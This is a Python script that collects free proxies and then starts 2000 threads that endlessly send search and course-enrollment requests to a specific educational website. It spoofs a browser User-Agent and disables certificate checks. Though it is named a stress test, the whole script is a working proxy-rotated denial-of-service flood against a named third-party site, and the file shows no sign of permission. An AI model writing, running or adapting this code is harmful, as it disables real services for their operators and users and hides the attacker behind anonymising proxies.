import requests
import re
import random
from concurrent.futures import ThreadPoolExecutor
from urllib3.exceptions import InsecureRequestWarning
from urllib3 import disable_warnings

# Disable the warning
disable_warnings(InsecureRequestWarning)

proxies = []

def get_proxy():
    global proxies

    proxy_endpoints = [
        'https://api.proxyscrape.com/v3/free-proxy-list/get?request=displayproxies&protocol=all&timeout=15000&proxy_format=protocolipport&format=json',
        'https://free-proxy-list.net/',
        'https://www.us-proxy.org/',
        'https://www.socks-proxy.net/',
        'https://www.juproxy.com/free_api'
    ]

    for endpoint in proxy_endpoints:
        try:
            proxy_info = requests.get(endpoint).text
            regex = re.compile(r'(\d+\.\d+\.\d+\.\d+):(\d+)')
            matches = regex.findall(proxy_info)
            if "socks-proxy" in endpoint:
                proxies += [f'socks5://{match[0]}:{match[1]}' for match in matches]
            else:
                proxies += [f'http://{match[0]}:{match[1]}' for match in matches]
        except requests.RequestException as e:
            print(f"Failed to fetch proxies from {endpoint}: {e}")

    # Remove duplicates
    proxies = list(set(proxies))
    # Remove empty strings
    proxies = list(filter(None, proxies))

def stress_test():
    url = 'https://ezd.edu.vn/?s=' + str(random.randint(100000000, 900000000))
    while True:
        try:
            s = requests.Session()
            proxy = random.choice(proxies)
            proxyDict = {"http": proxy, "https": proxy}
            response = s.get(url, timeout=30, headers={'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0'}, verify=False, proxies=proxyDict)
            response = s.post('https://ezd.edu.vn/wp-json/lp/v1/courses/enroll-course?_locale=user', timeout=30, headers={
                'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
                'Content-Type': 'application/json'
            }, verify=False, proxies=proxyDict, json={"id":"4008"})
            print(f"Request to {url} successful")
        except requests.RequestException as e:
            # If proxy fails, remove it from the list
            if proxy in proxies and e == requests.exceptions.ProxyError:
                proxies.remove(proxy)
                print(f"Removed proxy {proxy}")
            if len(proxies) == 0:
                get_proxy()
            # print(f"Request to {url} failed: {e}")

def main():
    with ThreadPoolExecutor(max_workers=2000) as executor:
        for i in range(2000):
            executor.submit(stress_test)

if __name__ == "__main__":
    get_proxy()
    main()
